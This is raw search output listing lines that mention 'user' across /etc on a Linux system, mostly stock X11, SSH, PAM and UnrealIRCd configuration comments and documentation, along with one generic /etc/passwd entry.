/etc/X11/xkb/symbols/nbsp:// This is good for typographers but experience shows many users accidently
/etc/X11/xkb/symbols/keypad:// As demanded by users not interested in legacy pre-unicode junk
/etc/X11/xkb/symbols/lk:// Unicode codepoints each. The result is that the user must
/etc/X11/xkb/symbols/ro:    // X users towards the secondary layout from the new standard.
/etc/X11/xkb/symbols/digital_vndr/us:// *           to Escape so users do not have to press Extend+F11  *
/etc/X11/xkb/symbols/cz:     // to satisfy most unix, windows and mac users.
/etc/X11/xkb/symbols/pl:// by Rafal Rzepecki <divide@users.sf.net>
/etc/X11/xkb/symbols/pl:// This layout aims to enable Polish Dvorak users to type with Russian
/etc/X11/xkb/symbols/inet:    key <I21> {       [ XF86User2KB           ]       };
/etc/X11/xkb/symbols/inet:    key <I6B> {       [ XF86User1KB           ]       };
/etc/X11/xkb/symbols/inet:    key <PAUS>        {       [ XF86UserPB            ]       };
/etc/X11/xkb/symbols/kpdl:// As a result users of SI-abiding countries expect either a "." or a ","
/etc/X11/xkb/symbols/kpdl:// It's not possible to define a default per-country since user expectations
/etc/X11/xkb/symbols/us:// alphabetical keys are added for being consequent so that the users
/etc/X11/xkb/symbols/sk:     // to satisfy most unix, windows and mac users.
/etc/X11/xkb/symbols/se:// alphabetical keys are added for being consequent so that the users
/etc/X11/xkb/symbols/cn:// affect users.
/etc/X11/xkb/symbols/cn:// according to user preference, but this is not practical for typing
/etc/X11/xkb/symbols/cn:// Users may prefer that the numeral keys enter ASCII numerals instead of
/etc/X11/xkb/symbols/cn:// This is especially an issue for laptop users who do not have a numeric
/etc/X11/xkb/symbols/cn:// if a clearly better use for the shifted numerals is pointed out by users.
/etc/X11/xkb/types/pc:   // for all the layout and is too invasive for your average four-level user
/etc/X11/Xsession:  # the user would have dismissed the error we want reported before seeing the
/etc/X11/Xsession:USERXSESSION=$HOME/.xsession
/etc/X11/Xsession:USERXSESSIONRC=$HOME/.xsessionrc
/etc/X11/Xsession:ALTUSERXSESSION=$HOME/.Xsession
/etc/X11/Xsession:  if ! ln -sf "$ERRFILE" "${TMPDIR:=/tmp}/xsession-$USER"; then
/etc/X11/Xsession:    message "warning: unable to symlink \"$TMPDIR/xsession-$USER\" to" \
/etc/X11/Xsession:             "\"$TMPDIR/xsession-$USER\"."
/etc/X11/Xsession:# error from tempfile and echo go to the error file to aid the user in
/etc/ssh/ssh_config:# users, and the values can be changed in per-user configuration files
/etc/ssh/ssh_config:#  2. user-specific file
/etc/ssh/sshd_config:# Don't read the user's ~/.rhosts and ~/.shosts files
/etc/ssh/sshd_config:#IgnoreUserKnownHosts yes
/etc/passwd:user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
/etc/cowpoke.conf:# The username for unprivileged operations on BUILDD_HOST
/etc/cowpoke.conf:#BUILDD_USER="$(id -un 2>/dev/null)"
/etc/cowpoke.conf:# The directory (under BUILDD_USER's home if relative) to upload packages
/etc/cowpoke.conf:# using a simple password (or worse, a normal user password), then you can
/etc/cowpoke.conf:# your choice.  If set, cowpoke will log in initially as the $BUILDD_USER,
/etc/hosts.equiv:# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
/etc/pam.d/common-account:# only deny service to users whose accounts are expired in /etc/shadow.
/etc/pam.d/cron:# Sets up user limits, please define limits for cron tasks
/etc/pam.d/sshd:# Print the status of the user's mailbox upon successful login.
/etc/pam.d/sshd:# Set up user limits from /etc/security/limits.conf.
/etc/pam.d/ftp:auth     required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
/etc/pam.d/ftp:#auth    required        pam_listfile.so item=user sense=allow file=/etc/ftpchroot onerr=fail
/etc/pam.d/common-password:# used to change user passwords.  The default is pam_unix.
/etc/pam.d/common-password:# The "nullok" option allows users to change an empty password, else
/etc/pam.d/common-password:# passwords do match, the NTLM hash for the user will be updated
/etc/pam.d/su:# Uncomment this to force users to be a member of group root
/etc/pam.d/su:# denying "root" user, unless she's a member of "foo" or explicitly
/etc/pam.d/su:# However, userdel also needs MAIL_DIR and MAIL_FILE variables
/etc/pam.d/su:# in /etc/login.defs to make sure that removing a user 
/etc/pam.d/su:# also removes the user's mail spool file.
/etc/pam.d/su:# "nopen" stands to avoid reporting new mail when su'ing to another user
/etc/pam.d/su:# Sets up user limits, please uncomment and read /etc/security/limits.conf
/etc/pam.d/proftpd:auth       required  pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
/etc/pam.d/proftpd:# unless you give the 'ftp' user a valid shell, or /bin/false and add
/etc/pam.d/chfn:# This allows root to change user infomation without being
/etc/pam.d/chsh:# This will not allow a user to change their shell unless
/etc/pam.d/chsh:# This allows root to change user shell without being
/etc/pam.d/login:# This allows certain extra groups to be granted to a user
/etc/pam.d/login:# based on things like time of day, tty, service, and user.
/etc/pam.d/login:# Sets up user limits according to /etc/security/limits.conf
/etc/pam.d/login:# Prints the status of the user's mailbox upon succesful login
/etc/pam.d/login:# However, userdel also needs MAIL_DIR and MAIL_FILE variables
/etc/pam.d/login:# in /etc/login.defs to make sure that removing a user 
/etc/pam.d/login:# also removes the user's mail spool file.
/etc/pam.d/login:# intended to run in the user's context should be run after this.  (When
Binary file /etc/unreal/modules/m_list.so matches
Binary file /etc/unreal/modules/m_map.so matches
Binary file /etc/unreal/modules/m_pass.so matches
Binary file /etc/unreal/modules/m_whowas.so matches
Binary file /etc/unreal/modules/m_motd.so matches
Binary file /etc/unreal/modules/m_silence.so matches
Binary file /etc/unreal/modules/m_nachat.so matches
Binary file /etc/unreal/modules/m_svso.so matches
Binary file /etc/unreal/modules/m_addline.so matches
Binary file /etc/unreal/modules/m_addmotd.so matches
Binary file /etc/unreal/modules/m_addomotd.so matches
Binary file /etc/unreal/modules/m_sendumode.so matches
Binary file /etc/unreal/modules/m_rping.so matches
Binary file /etc/unreal/modules/m_svspart.so matches
Binary file /etc/unreal/modules/m_connect.so matches
Binary file /etc/unreal/modules/m_stats.so matches
Binary file /etc/unreal/modules/m_part.so matches
Binary file /etc/unreal/modules/m_nick.so matches
Binary file /etc/unreal/modules/m_invite.so matches
Binary file /etc/unreal/modules/m_botmotd.so matches
Binary file /etc/unreal/modules/commands.so matches
Binary file /etc/unreal/modules/m_tkl.so matches
Binary file /etc/unreal/modules/m_adminchat.so matches
Binary file /etc/unreal/modules/m_svssilence.so matches
Binary file /etc/unreal/modules/m_svsnolag.so matches
Binary file /etc/unreal/modules/m_time.so matches
Binary file /etc/unreal/modules/m_lusers.so matches
Binary file /etc/unreal/modules/m_wallops.so matches
Binary file /etc/unreal/modules/m_tsctl.so matches
Binary file /etc/unreal/modules/m_chghost.so matches
Binary file /etc/unreal/modules/m_user.so matches
Binary file /etc/unreal/modules/m_opermotd.so matches
Binary file /etc/unreal/modules/m_sethost.so matches
Binary file /etc/unreal/modules/m_mkpasswd.so matches
Binary file /etc/unreal/modules/m_svslusers.so matches
Binary file /etc/unreal/modules/m_kick.so matches
Binary file /etc/unreal/modules/m_help.so matches
Binary file /etc/unreal/modules/m_lag.so matches
Binary file /etc/unreal/modules/m_undccdeny.so matches
Binary file /etc/unreal/modules/m_unzline.so matches
Binary file /etc/unreal/modules/m_watch.so matches
Binary file /etc/unreal/modules/m_svswatch.so matches
Binary file /etc/unreal/modules/m_samode.so matches
Binary file /etc/unreal/modules/m_svsfline.so matches
Binary file /etc/unreal/modules/cloak.so matches
Binary file /etc/unreal/modules/m_svskill.so matches
Binary file /etc/unreal/modules/m_who.so matches
Binary file /etc/unreal/modules/m_chatops.so matches
Binary file /etc/unreal/modules/m_admin.so matches
Binary file /etc/unreal/modules/m_guest.so matches
Binary file /etc/unreal/modules/m_umode2.so matches
Binary file /etc/unreal/modules/m_chgname.so matches
Binary file /etc/unreal/modules/m_ison.so matches
Binary file /etc/unreal/modules/m_swhois.so matches
Binary file /etc/unreal/modules/m_sapart.so matches
Binary file /etc/unreal/modules/m_pingpong.so matches
Binary file /etc/unreal/modules/m_svsnline.so matches
Binary file /etc/unreal/modules/m_sqline.so matches
Binary file /etc/unreal/modules/m_sdesc.so matches
Binary file /etc/unreal/modules/m_userip.so matches
Binary file /etc/unreal/modules/m_sendsno.so matches
Binary file /etc/unreal/modules/m_dccdeny.so matches
Binary file /etc/unreal/modules/m_htm.so matches
Binary file /etc/unreal/modules/m_svsnoop.so matches
Binary file /etc/unreal/modules/m_names.so matches
Binary file /etc/unreal/modules/m_sajoin.so matches
Binary file /etc/unreal/modules/m_message.so matches
Binary file /etc/unreal/modules/m_unsqline.so matches
Binary file /etc/unreal/modules/m_server.so matches
Binary file /etc/unreal/modules/m_setname.so matches
Binary file /etc/unreal/modules/m_mode.so matches
Binary file /etc/unreal/modules/m_kill.so matches
Binary file /etc/unreal/modules/m_chgident.so matches
Binary file /etc/unreal/modules/m_unkline.so matches
Binary file /etc/unreal/modules/m_netinfo.so matches
Binary file /etc/unreal/modules/m_sjoin.so matches
Binary file /etc/unreal/modules/m_userhost.so matches
Binary file /etc/unreal/modules/m_cycle.so matches
Binary file /etc/unreal/modules/m_dccallow.so matches
Binary file /etc/unreal/modules/m_knock.so matches
Binary file /etc/unreal/modules/m_svsjoin.so matches
Binary file /etc/unreal/modules/m_away.so matches
Binary file /etc/unreal/modules/m_oper.so matches
Binary file /etc/unreal/modules/m_topic.so matches
Binary file /etc/unreal/modules/m_close.so matches
Binary file /etc/unreal/modules/m_setident.so matches
Binary file /etc/unreal/modules/m_locops.so matches
Binary file /etc/unreal/modules/m_svsmotd.so matches
Binary file /etc/unreal/modules/m_protoctl.so matches
Binary file /etc/unreal/modules/m_rakill.so matches
Binary file /etc/unreal/modules/m_rules.so matches
Binary file /etc/unreal/modules/m_trace.so matches
Binary file /etc/unreal/modules/m_svsmode.so matches
Binary file /etc/unreal/modules/m_globops.so matches
Binary file /etc/unreal/modules/m_squit.so matches
Binary file /etc/unreal/modules/m_links.so matches
Binary file /etc/unreal/modules/m_svssno.so matches
Binary file /etc/unreal/modules/m_whois.so matches
Binary file /etc/unreal/modules/m_join.so matches
Binary file /etc/unreal/modules/m_vhost.so matches
Binary file /etc/unreal/modules/m_akill.so matches
Binary file /etc/unreal/modules/m_svsnick.so matches
Binary file /etc/unreal/modules/m_quit.so matches
Binary file /etc/unreal/modules/m_eos.so matches
/etc/unreal/badwords.quit.conf: NOTE: Those words are not meant to insult you (the user)
/etc/unreal/Donation:into creating and maintaining Unreal. To make it easier for user's to show their
/etc/unreal/dccallow.conf: * all 'allow dcc'-blocks and prompt the user for EVERY file ;).
/etc/unreal/dccallow.conf: * Still, I think this file is a good tradeoff between userfriendlyness
/etc/unreal/unrealircd.conf:            userhost Me@and.my.host;
/etc/unreal/unrealircd.conf:    username        *;
/etc/unreal/unrealircd.conf:ban user {
/etc/unreal/unrealircd.conf:            userhost       *@*;
/etc/unreal/unrealircd.conf:    maxchannelsperuser 30;
/etc/unreal/badwords.message.conf: NOTE: Those words are not meant to insult you (the user)
/etc/unreal/badwords.message.conf:       but is meant to be a list of words so that the +G channel/user mode 
/etc/unreal/LICENSE:software--to make sure the software is free for all its users.  This
/etc/unreal/LICENSE:    a warranty) and that users may redistribute the program under
/etc/unreal/LICENSE:    these conditions, and telling the user how to view a copy of this
/etc/unreal/doc/coding-guidelines:10. Be careful about overflows. As you know a line from a user can never be longer
/etc/unreal/doc/Authors:Karl Kleinpaste <karl@cis.ohio-state.edu>: user's manual
/etc/unreal/doc/example.conf: *     pingfreq (how often to ping a user/server in seconds);
/etc/unreal/doc/example.conf: * Allows a user to join a channel...
/etc/unreal/doc/example.conf: *        userhost (ident@host);
/etc/unreal/doc/example.conf: *        userhost (ident@host);
/etc/unreal/doc/example.conf:           userhost bob@smithco.com;
/etc/unreal/doc/example.conf: * allow users/servers to connect to the server. 
/etc/unreal/doc/example.conf: * username        (username, * works too);
/etc/unreal/doc/example.conf:   username        *;
/etc/unreal/doc/example.conf:// This points the command /nickserv to the user NickServ who is connected to the set::services-server server
/etc/unreal/doc/example.conf:// Points the /statserv command to the user StatServ on the set::stats-server server
/etc/unreal/doc/example.conf:// Points the /superbot command to the user SuperBot
/etc/unreal/doc/example.conf: * the user's nickname.
/etc/unreal/doc/example.conf: * NEW: ban user {}
/etc/unreal/doc/example.conf: * This makes it so a user from a certain mask can't connect
/etc/unreal/doc/example.conf: * ban user { mask (hostmask/ip number); reason "(reason)"; };
/etc/unreal/doc/example.conf:ban user {
/etc/unreal/doc/example.conf: *            userhost (ident@host to allow to use it);
/etc/unreal/doc/example.conf:           userhost       *@*.image.dk;
/etc/unreal/doc/example.conf:   maxchannelsperuser 10;
/etc/unreal/doc/example.conf:   /* The minimum time a user must be connected before being allowed to use a QUIT message,
/etc/unreal/doc/example.conf:    * leave it out to allow users to see all stats. Type '/stats' for a full list.
/etc/unreal/doc/example.conf:    * Some admins might want to remove the 'kGs' to allow normal users to list
/etc/unreal/doc/unreal32docs.html:  ---4.14. <a href="#banuserblock">Ban User Block -=- (K:Line)</a><br>
/etc/unreal/doc/unreal32docs.html:  6. <a href="#userchannelmodes">User & Channel Modes</a><br>
/etc/unreal/doc/unreal32docs.html:  7. <a href="#useropercommands">User & Oper Commands</a><br>
/etc/unreal/doc/unreal32docs.html:  ---8.4. <a href="#secuser">User-related problems</a><br>
/etc/unreal/doc/unreal32docs.html:<p>Cloaking is a way to hide the real hostname of users, for example if your real host is <i>d5142341.cable.wanadoo.nl</i>,
/etc/unreal/doc/unreal32docs.html:   This feature is useful to prevent users flooding each other since they can't see the real host/IP.</p>
/etc/unreal/doc/unreal32docs.html:<p>This is controlled by usermode +x (like: /mode yournick +x), admins can also force +x to be enabled 
/etc/unreal/doc/unreal32docs.html:   by default, or make it so users can never do -x.</p>
/etc/unreal/doc/unreal32docs.html:   - Other people can create (3rd party) modules with new commands, usermodes and even channelmodes.<br>
/etc/unreal/doc/unreal32docs.html:<p>Snomasks are server notice masks, it's a special type of usermode that controls which 
/etc/unreal/doc/unreal32docs.html:<p>By default, if a user simply sets mode +s, certain snomasks are set. For non-opers, snomasks +ks, and for opers, snomasks +kscfvGqo.</p></div>
/etc/unreal/doc/unreal32docs.html:<p>UnrealIRCd has a built-in help system accessible by /helpop. The /helpop command is completely user configurable via
/etc/unreal/doc/unreal32docs.html:<p>UnrealIRCd has a lot of powerful oper commands which are explained in <a href="#useropercommands">User &amp; Oper Commands</a>,
/etc/unreal/doc/unreal32docs.html:   many users, it can help a lot when you are linking since a lot of data is sent about every user/channel/etc.</p>
/etc/unreal/doc/unreal32docs.html:<p>UnrealIRCd has some (new) nice features which helps dynamic IP users using dynamic DNS (like blah.dyndns.org).
/etc/unreal/doc/unreal32docs.html:Throttling is a method that allows you to limit how fast a user can disconnect and then reconnect to your server. 
/etc/unreal/doc/unreal32docs.html:<b>K</b> = no /knock, <b>N</b> = no nickchanges, <b>C</b> = no CTCPs, <b>M</b> = only registered users can talk, <b>j</b> = join throttling (per-user basis)<br>
/etc/unreal/doc/unreal32docs.html:<tr><td>t</td><td>text</td><td>kick</td><td>b</td><td>per-user messages/notices like the old +f. Will kick or ban the user.</td></tr>
/etc/unreal/doc/unreal32docs.html:The old +f mode (msgflood per-user) is also still available as 't', +f 10:6 is now called +f [10t]:6 and 
/etc/unreal/doc/unreal32docs.html:What the best +f mode is heavily depends on the channel... how many users does it have? do you have a game that makes users 
/etc/unreal/doc/unreal32docs.html:msg a lot (eg: trivia) or do users often use popups? is it some kind of mainchannel or in auto-join? etc..<br>
/etc/unreal/doc/unreal32docs.html:If it's some kind of large user channel (&gt;75 users?) you will want to increase the join sensitivity (to eg: 50) and the 
/etc/unreal/doc/unreal32docs.html:the situation, do I want to have the channel locked for like 15 minutes (=not nice for users) or 5 minutes (=likely the flooders 
/etc/unreal/doc/unreal32docs.html:will just wait 5m and flood again). It also depends on the floodtype, users unable to join (+i) or speak (+m) is worse than 
/etc/unreal/doc/unreal32docs.html:example, if it is set to 5:10 and 5 <u>different</u> users join in 10 seconds, the flood 
/etc/unreal/doc/unreal32docs.html:protection is triggered. Channel mode +j is different. This mode works on a per-user basis. 
/etc/unreal/doc/unreal32docs.html:joins and Y is the number of seconds. If a user exceeds this limit, he/she will be prevented 
/etc/unreal/doc/unreal32docs.html:UnrealIRCd supports the basic bantypes like <i>+b nick!user@host</i>.<br>
/etc/unreal/doc/unreal32docs.html:then if the user sets himself -x (and his hosts becomes for example 'dial-123.isp.com) then the ban 
/etc/unreal/doc/unreal32docs.html:If a user has the IP 1.2.3.4 his cloaked host could be 341C6CEC.8FC6128B.303AEBC6.IP.<br>
/etc/unreal/doc/unreal32docs.html:<tr><td>~c</td><td>[prefix]channel</td><td>If the user is in this channel then (s)he is unable to join. 
/etc/unreal/doc/unreal32docs.html: A prefix can also be specified (+/%/@/&amp;/~) which means that it will only match if the user has
/etc/unreal/doc/unreal32docs.html:<tr><td>~r</td><td>realname</td><td>If the realname of a user matches this then (s)he is unable to join.<br>
/etc/unreal/doc/unreal32docs.html:   <tr><td>p</td><td>private</td><td>Private message (from user-&gt;user)</td></tr>
/etc/unreal/doc/unreal32docs.html:   <tr><td>u</td><td>user</td><td>User ban, will be matched against nick!user@host:realname</td></tr>
/etc/unreal/doc/unreal32docs.html:<tr><td>kill</td><td>kills the user</td></tr>
/etc/unreal/doc/unreal32docs.html:<tr><td>tempshun</td><td>shuns the current session of the user (if [s]he reconnects the shun is gone)</td></tr>
/etc/unreal/doc/unreal32docs.html:<tr><td>dccblock</td><td>mark the user so (s)he's unable to send any DCCs</td></tr>
/etc/unreal/doc/unreal32docs.html:   If <i>come watch me on my webcam</i> is found in a private msg then the user is glined for 3 hours 
/etc/unreal/doc/unreal32docs.html:   Spamfilters added with /spamfilter are network-wide. They work regardless of whether the user/channel
/etc/unreal/doc/unreal32docs.html:used in the allow::ip, oper::from::userhost, ban user::mask, ban ip::mask, except ban::mask,
/etc/unreal/doc/unreal32docs.html:Example 2, if you have mainly chinese users and want to allow "normal" chinese characters:<br>
/etc/unreal/doc/unreal32docs.html:gateways as "trusted" which will cause the IRCd to show the users' real host/ip everywhere on
/etc/unreal/doc/unreal32docs.html:users can be killed, channels might not show up properly in /LIST, in short: huge trouble will arrise.</p>
/etc/unreal/doc/unreal32docs.html:  a sub-type such as in ban user.</p>
/etc/unreal/doc/unreal32docs.html:   directory (eg: /home/user/Unreal3.2) and rename it to <i>unrealircd.conf</i>
/etc/unreal/doc/unreal32docs.html: (this only applies to normal users, try experimenting with values 3000-8000, 8000 is the default).</p>
/etc/unreal/doc/unreal32docs.html:      ip &lt;user@ip-connection-mask&gt;;
/etc/unreal/doc/unreal32docs.html:      hostname &lt;user@host-connection-mask&gt;;
/etc/unreal/doc/unreal32docs.html:   The ip mask is in the form user@ip, user is the ident and often set at *, ip is the ipmask.
/etc/unreal/doc/unreal32docs.html:   Also a user@host hostmask, again.. user is often set at *. Some examples: *@* (everywhere), 
/etc/unreal/doc/unreal32docs.html:   If the class is full, redirect users to this server (if clients supports it [mIRC 6 does]).</p>
/etc/unreal/doc/unreal32docs.html:&nbsp;&nbsp;&nbsp;<b>noident</b> don't use ident but use username specified by client<br>
/etc/unreal/doc/unreal32docs.html:  value. For example, 6660-6669 would listen on ports 6660 through 6669 (inclusive). IPv6 users, see below.</p>
/etc/unreal/doc/unreal32docs.html:<p><b>Info for IPv6 users</b><br>
/etc/unreal/doc/unreal32docs.html:              userhost &lt;hostmask&gt;;
/etc/unreal/doc/unreal32docs.html:              userhost &lt;hostmask&gt;;
/etc/unreal/doc/unreal32docs.html:  specifies the login name for the /oper. The <b>oper::from::userhost</b> is a user@host 
/etc/unreal/doc/unreal32docs.html:  mask that the user must match, you can specify more than one hostmask by creating 
/etc/unreal/doc/unreal32docs.html:  more than one oper::from::userhost. The <b>oper::password</b> is the password the user 
/etc/unreal/doc/unreal32docs.html:    <td>Can /kill local users</td>
/etc/unreal/doc/unreal32docs.html:    <td>Can /kill global users</td>
/etc/unreal/doc/unreal32docs.html:    <td>Can use usermode +q</td>
/etc/unreal/doc/unreal32docs.html:              userhost bob@smithco.com;
/etc/unreal/doc/unreal32docs.html:              userhost boblaptop@somedialupisp.com;
/etc/unreal/doc/unreal32docs.html:  <tr><td>connects</td><td>logs user connects/disconnects</td></tr>
/etc/unreal/doc/unreal32docs.html:<p>The tld block allows you to specify a motd, rules, and channel for a user based 
/etc/unreal/doc/unreal32docs.html:  The <b>tld::mask</b> is a user@host mask that the user's username and hostname must 
/etc/unreal/doc/unreal32docs.html:  is optional as well, it allows you to specify a channel that this user will be forced
/etc/unreal/doc/unreal32docs.html:  currently only tld::options::ssl which only displays the file for SSL users, and
/etc/unreal/doc/unreal32docs.html:  tld::options::remote which only displays the file for remote users, exists.</p>
/etc/unreal/doc/unreal32docs.html:<p><font class="block_section">4.14 - </font><font class="block_name">Ban User Block</font>
/etc/unreal/doc/unreal32docs.html:   <font class="block_optional">OPTIONAL</font> <font class="block_old">(Previously known as the K:Line)</font><a name="banuserblock"></a><div class="desc">
/etc/unreal/doc/unreal32docs.html:ban user {
/etc/unreal/doc/unreal32docs.html:<p>This block allows you to ban a user@host mask from connecting to the server. 
/etc/unreal/doc/unreal32docs.html:  The ban::mask is a wildcard string of a user@host to ban, and ban::reason is 
/etc/unreal/doc/unreal32docs.html:  the user may connect to other servers on the network.</p>
/etc/unreal/doc/unreal32docs.html:ban user {
/etc/unreal/doc/unreal32docs.html:<p>The ban ip block bans an IP from accessing the server. This includes both users 
/etc/unreal/doc/unreal32docs.html:  <i>tempshun</i> will shun the specific user connection only and would work very effective against 
/etc/unreal/doc/unreal32docs.html:  zombies/bots at dynamic IPs because it won't affect innocent users. <i>shun/kline/zline/gline/gzline</i> 
/etc/unreal/doc/unreal32docs.html:<p>The except ban block allows you to specify a user@host that will override a 
/etc/unreal/doc/unreal32docs.html:  still want specific users to be able to connect. The except::mask directive 
/etc/unreal/doc/unreal32docs.html:  specifies the user@host mask of the client who will be allowed to connect.</p>
/etc/unreal/doc/unreal32docs.html:<p>The except tkl block allows you to specify a user@host that will override a 
/etc/unreal/doc/unreal32docs.html:  still want specific users to be able to connect. The except::mask directive 
/etc/unreal/doc/unreal32docs.html:  specifies the user@host mask of the client who will be allowed to connect. The 
/etc/unreal/doc/unreal32docs.html:   unless the user explicitly allows it via /DCCALLOW +nickname-trying-to-send. 
/etc/unreal/doc/unreal32docs.html:<p>The deny channel block allows you to disallow users from joining specific channels. 
/etc/unreal/doc/unreal32docs.html:  The <b>deny::channel</b> directive specifies a wildcard mask of channels the users 
/etc/unreal/doc/unreal32docs.html:  when a user tries to join a channel that matches deny::channel, he/she will be redirected
/etc/unreal/doc/unreal32docs.html:  opernotice (to EYES snomask) if the user tries to join.
/etc/unreal/doc/unreal32docs.html:<p>The allow channel block allows you to specify specific channels that users 
/etc/unreal/doc/unreal32docs.html:              userhost &lt;hostmask&gt;;
/etc/unreal/doc/unreal32docs.html:              userhost &lt;hostmask&gt;;
/etc/unreal/doc/unreal32docs.html:  be either a user@host or just a host that the user will receive upon successful 
/etc/unreal/doc/unreal32docs.html:  /vhost. The vhost::from::userhost contains a user@host that the user must match 
/etc/unreal/doc/unreal32docs.html:  in the login name the user must enter and vhost::password is the password that 
/etc/unreal/doc/unreal32docs.html:  line to a users whois, exactly as it does in the Oper Block oper::swhois.</p>
/etc/unreal/doc/unreal32docs.html:              userhost my@isp.com;
/etc/unreal/doc/unreal32docs.html:              userhost myother@isp.com;
/etc/unreal/doc/unreal32docs.html:<p>The badword block allows you to manipulate the list used for user and channel 
/etc/unreal/doc/unreal32docs.html:  is for the user +G list, quit is for quit message censoring, and all adds it to all three lists. 
/etc/unreal/doc/unreal32docs.html:      username &lt;usermask&gt;;
/etc/unreal/doc/unreal32docs.html:   this because this one of the hardest things to do and users often make errors ;P</p>
/etc/unreal/doc/unreal32docs.html:<p><b>username</b><br>
/etc/unreal/doc/unreal32docs.html:      username *;
/etc/unreal/doc/unreal32docs.html:<p>The alias block [standard alias] allows you to forward a command to a user, 
/etc/unreal/doc/unreal32docs.html:  for example /chanserv sends a message to the user chanserv. The alias:: specifies 
/etc/unreal/doc/unreal32docs.html:  of alias, valid types are services (the user is on the services server), stats 
/etc/unreal/doc/unreal32docs.html:  (the user is on the stats server), normal (the user is a normal user on 
/etc/unreal/doc/unreal32docs.html:      /* For aliases to be sent to users/channels */
/etc/unreal/doc/unreal32docs.html:  by the nickname of the user who executed the command.<br><br>
/etc/unreal/doc/unreal32docs.html:  for the help block are the text that will be displayed to the user when requesting 
/etc/unreal/doc/unreal32docs.html:<p>Official channels are shown in /list even if no users are in the channel.
/etc/unreal/doc/unreal32docs.html:   The <b>topic</b> is optional and is only shown in /list if it has 0 users.
/etc/unreal/doc/unreal32docs.html:      username &lt;mask&gt;; /* optional */
/etc/unreal/doc/unreal32docs.html:   <b>username</b> is matched against the ident (if present). If not specified, "*" is assumed.<br>
/etc/unreal/doc/unreal32docs.html:specify a server password as a CGI:IRC user. Additionally, access control is only
/etc/unreal/doc/unreal32docs.html:  The modes that will be set on a user at connection.</p>
/etc/unreal/doc/unreal32docs.html:  The snomask that will be set on a user at connection.</p>
/etc/unreal/doc/unreal32docs.html:  The modes that will be set on a user when they /oper.</p>
/etc/unreal/doc/unreal32docs.html:  The snomask that will be set on a user when they /oper.</p>
/etc/unreal/doc/unreal32docs.html:  The mode that a user will get when he's the first to join a channel. This
/etc/unreal/doc/unreal32docs.html:<p><font class="set">set::restrict-usermodes &lt;modes&gt;</font><br>
/etc/unreal/doc/unreal32docs.html:  Restrict users to set/unset the modes listed here (don't use + or -).<br>
/etc/unreal/doc/unreal32docs.html:  For example you can set +G in modes-on-connect and G in restrict-usermodes,
/etc/unreal/doc/unreal32docs.html:  that way you can force all users to be +G and unable to do -G.</p>
/etc/unreal/doc/unreal32docs.html:  Restrict users to set/unset the channelmodes listed here (don't use + or -).<br>
/etc/unreal/doc/unreal32docs.html:  Don't allow users to use any extended bans ("*") or disallow only certain ones (eg: "qc").</p>
/etc/unreal/doc/unreal32docs.html:  The channel(s) a user will be forced to join at connection. To specify more 
/etc/unreal/doc/unreal32docs.html:  The channel(s) a user will be forced to join when they /oper. To specify more 
/etc/unreal/doc/unreal32docs.html:  A time value specifying the length of time a user must be connected for before 
/etc/unreal/doc/unreal32docs.html:  only opers can use. Leave this value out to allow users to use all flags, or 
/etc/unreal/doc/unreal32docs.html:  specify * for users to be able to use no flags. Only short stats flags may be specified
/etc/unreal/doc/unreal32docs.html:<p><font class="set">set::maxchannelsperuser &lt;amount-of-channels&gt;;</font><br>
/etc/unreal/doc/unreal32docs.html:  Specifies the number of channels a single user may be in at any one time.</p>
/etc/unreal/doc/unreal32docs.html:  Specifies the maximum number of entries a user can have on his/her DCCALLOW list.</p>
/etc/unreal/doc/unreal32docs.html:<p><font class="set">set::allow-userhost-change [never|always|not-on-channels|force-rejoin]</font><br>
/etc/unreal/doc/unreal32docs.html:  Specifies what happens when the user@host changes (+x/-x/chghost/chgident/setident/vhost/etc).<br>
/etc/unreal/doc/unreal32docs.html:  user is not on any channel, <i>force-rejoin</i> will force a rejoin in all channels and re-op/voice/etc if needed.</p>
/etc/unreal/doc/unreal32docs.html:  If present the opermotd will be shown to users once they successfully /oper.</p>
/etc/unreal/doc/unreal32docs.html:  value will be used for the username. If no ident request is returned or the 
/etc/unreal/doc/unreal32docs.html:  identd server doesn't exist, the user's specified username will be prefixed 
/etc/unreal/doc/unreal32docs.html:  etc. will be displayed when a user connects.</p>
/etc/unreal/doc/unreal32docs.html:  If present hosts of incoming users are not resolved, can be useful if many of your
/etc/unreal/doc/unreal32docs.html:  users don't have a host to speed up connecting.<br>
/etc/unreal/doc/unreal32docs.html:  Allow shunned user to use /part.</p>
/etc/unreal/doc/unreal32docs.html:  If present, a user will be notified that his/her failed /oper attempt has been logged.</p>
/etc/unreal/doc/unreal32docs.html:  Defines the name of the default server to tell users to connect to if this server 
/etc/unreal/doc/unreal32docs.html:  optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  +x. You may optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  optionally specify a username@host for this value.</p>
/etc/unreal/doc/unreal32docs.html:  set at /oper. If set to no, the user must set +x manually to receive the oper 
/etc/unreal/doc/unreal32docs.html:  How long a user must wait before reconnecting more than set::throttle::connections
/etc/unreal/doc/unreal32docs.html:  How many times a user must connect with the same host to be throttled.</p>
/etc/unreal/doc/unreal32docs.html:  in order for the user to be killed.</p>
/etc/unreal/doc/unreal32docs.html:  If set to yes (or '1') it replies 'invite only' to any normal users that try to join 
/etc/unreal/doc/unreal32docs.html:  Whenever the user changes his/her nick, check if the NEW nick would be
/etc/unreal/doc/unreal32docs.html:  When NOSPOOF is enabled (usually on Windows), send a warning to each user to use
/etc/unreal/doc/unreal32docs.html:    <td>ircd.motd</td><td>Displayed when a /motd is executed and (if ircd.smotd is not present) when a user connects</td> 
/etc/unreal/doc/unreal32docs.html:<p><b><font size="+2">6 &#8211; User & Channel Modes<a name="userchannelmodes"></a>
/etc/unreal/doc/unreal32docs.html:    <td>Makes the user a channel admin</td>
/etc/unreal/doc/unreal32docs.html:    <td><div align="center">b &lt;nick!user@host&gt;<br>
/etc/unreal/doc/unreal32docs.html:    <td>Bans the given user from the channel</td>
/etc/unreal/doc/unreal32docs.html:    <td><div align="center">e &lt;nick!user@host&gt;</div></td>
/etc/unreal/doc/unreal32docs.html:    <td>Gives half-op status to the user</td>
